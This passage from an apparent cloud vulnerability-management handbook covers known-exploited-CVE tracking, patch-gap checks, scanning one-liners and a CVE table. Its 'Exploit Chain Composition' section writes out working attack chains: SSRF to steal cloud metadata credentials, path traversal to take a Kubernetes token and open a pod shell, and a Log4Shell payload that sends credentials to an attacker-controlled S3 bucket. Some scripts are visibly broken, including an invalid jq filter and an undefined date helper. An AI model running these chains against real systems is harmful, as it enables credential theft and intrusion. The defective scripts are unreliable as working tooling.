  | grep -v 'your-internal-registry.example.com'
```

---

## 15. KEV Tracking Automation

### 15.1 Daily KEV pull + cloud-native filter

```bash
#!/usr/bin/env bash
# kev-daily.sh — daily KEV diff for cloud-native CVEs
set -euo pipefail
TODAY=$(date +%Y-%m-%d)
YESTERDAY=$(date -d '1 day ago' +%Y-%m-%d)
KEYWORDS="kubernetes|container|docker|runc|containerd|istio|envoy|etcd|cilium|openshift|azure|aws|gcp|cosmos|omi|imds|ecs|eks|gke|aks"

# Pull current KEV
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json -o /tmp/kev-${TODAY}.json

# Diff against yesterday's snapshot
if [[ -f /tmp/kev-${YESTERDAY}.json ]]; then
    diff <(jq -r '.vulnerabilities[] | .cveID' /tmp/kev-${YESTERDAY}.json | sort) \
         <(jq -r '.vulnerabilities[] | .cveID' /tmp/kev-${TODAY}.json | sort) \
         | grep '^>' | sed 's/^> //' > /tmp/kev-new.txt
    echo "=== New KEV additions ==="
    cat /tmp/kev-new.txt
    echo "=== Cloud-native filter ==="
    jq --arg kw "$KEYWORDS" \
       '.vulnerabilities[] | select(.cveID as $c | $c | IN(//tmp/kev-new.txt)) | select((.product // "") | test($kw; "i"))' \
       /tmp/kev-${TODAY}.json
fi
```

### 15.2 KEV + EPSS join

```bash
# For each KEV addition, pull EPSS for prioritization
for cve in $(cat /tmp/kev-new.txt); do
    epss=$(curl -s "https://api.first.org/data/v1/epss?cve=${cve}" | jq -r '.data[0].epss // "n/a"')
    echo "${cve} epss=${epss}"
done | column -t
```

### 15.3 KEV → SBOM match

```bash
# Match today's KEV additions against the org's SBOM
jq -r '.vulnerabilities[].cveID' /tmp/kev-${TODAY}.json | sort -u > /tmp/kev-all.txt
jq -r '.matches[].vulnerability.id' grype.json | sort -u > /tmp/our-cves.txt
echo "=== KEV-listed CVEs present in our images ==="
comm -12 /tmp/kev-all.txt /tmp/our-cves.txt
```

---

## 16. Patch Gap Analysis

### 16.1 Ubuntu/Debian package diff

```bash
# Compare installed version vs latest patched version (Ubuntu USN)
apt list --installed 2>/dev/null | grep -i openssl

# Pull the latest USN
curl -s https://usn.ubuntu.com/usn/rss.xml | grep -o 'USN-[0-9-]*' | head

# Query the Ubuntu security tracker for a specific CVE
curl -s "https://ubuntu.com/security/cves?q=openssl&package=openssl&priority=High&priority=Critical&offset=0" \
  | grep -oE 'CVE-[0-9]+-[0-9]+' | sort -u
```

### 16.2 Alpine package diff

```bash
# Alpine: apk audit + secdb
docker run --rm alpine:3.18 sh -c "apk update && apk audit"

# Pull Alpine secdb
curl -s https://secdb.alpinelinux.org/v3.18/main.json | jq '.packages[] | select(.name=="openssl") | .secfixes'
```

### 16.3 USN/DSA tracking

```bash
# Subscribe to Ubuntu Security Notices
# RSS: https://usn.ubuntu.com/usn/rss.xml
# Debian: https://www.debian.org/security/dsa-long

# Daily diff
curl -s https://usn.ubuntu.com/usn/rss.xml | grep -oE 'USN-[0-9-]+' | sort -u > /tmp/usn-today.txt
diff /tmp/usn-yesterday.txt /tmp/usn-today.txt
```

### 16.4 Patch lag dashboard

```bash
# Compute days-since-fix-released for each image's CVEs
jq -r '.Results[]?.Vulnerabilities[]? | "\(.VulnerabilityID) \(.FixedVersion) \(.PublishedDate)"' trivy.json | sort -u > /tmp/cve-fix.tsv
while IFS=$'\t' read -r cve fixed published; do
    if [[ -n "$fixed" ]]; then
        days=$(date_diff_days "$published")
        echo "${cve} ${fixed} ${days}d"
    fi
done < /tmp/cve-fix.tsv | sort -k3 -nr | head -20
```

---

## 17. Exploit Chain Composition

### 17.1 SSRF → IMDSv1 → cloud role → k8s RBAC

```bash
# Step 1: SSRF in a web app (CVE-2026-21858 example)
curl 'http://target.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# Step 2: Exfil role credentials
curl 'http://target.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name'

# Step 3: Use role creds from attacker machine
export AWS_ACCESS_KEY_ID=REPLACE_WITH_YOUR_KEY
export AWS_SECRET_ACCESS_KEY=REPLACE_WITH_YOUR_SECRET
export AWS_SESSION_TOKEN=REPLACE_WITH_YOUR_TOKEN
aws sts get-caller-identity

# Step 4: Enumerate EKS clusters
aws eks list-clusters --region us-east-1
aws eks describe-cluster --name victim-prod --region us-east-1

# Step 5: Assume the cluster-admin role via aws-auth ConfigMap (if you have it)
# Or: enumerate IAM permissions for further pivot.
```

### 17.2 LFI → secrets read → kubelet → RCE → container escape

```bash
# Step 1: LFI exposes /var/run/secrets/kubernetes.io/serviceaccount/token
curl 'http://target.local/view?file=../../../../var/run/secrets/kubernetes.io/serviceaccount/token'
TOKEN=$(curl -s 'http://target.local/view?file=../../../../var/run/secrets/kubernetes.io/serviceaccount/token')

# Step 2: Use the token to query the API
APISERVER=https://kubernetes.default.svc
curl -sk -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces

# Step 3: If pods/exec allowed, get a shell
kubectl --token "${TOKEN}" --server "${APISERVER}" --insecure-skip-tls-verify \
  exec -n default some-pod -- /bin/sh

# Step 4: Inside the pod, attempt container escape via CVE-2022-0185
# (if CAP_SYS_ADMIN available + vulnerable kernel)
```

### 17.3 Log4Shell → cloud metadata → S3 exfil

```bash
# Step 1: Log4Shell JNDI in a Java web app
curl -H 'User-Agent: ${jndi:ldap://attacker/Basic/Command/Base64/<b64payload>}' \
  http://target.local/

# Payload: curl IMDS → exfil to attacker S3
echo -n 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | aws s3 cp - s3://attacker-bucket/exfil.txt' | base64

# Step 2: On the attacker side, parse the S3 upload to extract role creds
aws s3 cp s3://attacker-bucket/exfil.txt - | jq
```

---

## 18. Quick Reference Cheat Sheet

### 18.1 Common nuclei one-liners

```bash
# Run all CVE templates for 2026 against a target
nuclei -u https://target.local -t cves/2026/ -severity critical,high

# Run all exposures templates
nuclei -u https://target.local -t exposures/ -severity high,critical

# Run a single CVE template
nuclei -u https://target.local -t cves/2026/CVE-2026-21858.yaml

# Rate-limited bulk scan
nuclei -l urls.txt -severity critical,high -rate-limit 50 -c 25 -bulk-size 25

# Output JSON for downstream processing
nuclei -u https://target.local -t cves/2026/ -json -o nuclei-results.json
```

### 18.2 SBOM + scan workflow

```bash
# One-shot SBOM → scan → KEV cross-ref
syft image:myrepo/app:v1 -o spdx-json > sbom.json
grype sbom:sbom.json --severity high,critical -o json > grype.json
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json -o kev.json
# Find KEV-listed CVEs in our image
comm -12 \
  <(jq -r '.vulnerabilities[].cveID' kev.json | sort -u) \
  <(jq -r '.matches[].vulnerability.id' grype.json | sort -u)
```

### 18.3 Patch diff workflow

```bash
# One-shot patch diff
git log --oneline v1..v2 | head
git diff v1..v2 -- src/
gh advisory view GHSA-xxxx-xxxx-xxxx
```

### 18.4 Lab spin-up quick recipes

```bash
# Docker lab (snapshot-rollback)
docker run -d --name lab -p 8080:8080 vuln/img:v1

# kind cluster at a specific version
kind create cluster --image kindest/node:v1.22.9

# minikube with specific k8s version
minikube start --kubernetes-version=v1.22.0

# Multi-arch QEMU
docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
```

### 18.5 Key CVEs reference table

| CVE | Component | Class | CVSS | Lab Image |
|-----|-----------|-------|------|-----------|
| CVE-2021-44228 | log4j-core | JNDI RCE | 10.0 | vuln/log4shell:2.14.0 |
| CVE-2022-22965 | Spring Framework | Class loader RCE | 9.8 | vuln/spring4shell:5.3.17 |
| CVE-2022-42889 | Apache Commons Text | Lookup RCE | 9.8 | vuln/commons-text:1.9 |
| CVE-2021-38645 | Azure OMI | Unauth RCE | 9.8 | azure-omi:1.6.8 |
| CVE-2022-0185 | Linux kernel | Container escape | 8.4 | ubuntu:20.04 (kernel<5.16.5) |
| CVE-2022-0847 | Linux kernel | Dirty Pipe LPE | 7.8 | ubuntu:20.04 (5.8≤kernel<5.16.11) |
| CVE-2019-5736 | runc | Container escape | 8.6 | ubuntu:18.04 (runc<1.0-rc6) |
| CVE-2018-1002105 | k8s API server | Priv esc | 9.8 | kind node v1.10.13 |
| CVE-2026-21858 | (example) | Auth bypass | 9.8 | vuln/acme:3.4.1 |

### 18.6 Useful endpoints / feeds

```bash
# Feeds to subscribe to
# - NVD JSON 1.1 feed: https://nvd.nist.gov/vuln/data-feeds
# - CISA KEV: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
# - GitHub Advisory Database: https://github.com/advisories
# - OSV.dev: https://osv.dev/
# - ProjectRelease nuclei-templates releases: https://github.com/projectdiscovery/nuclei-templates/releases
```
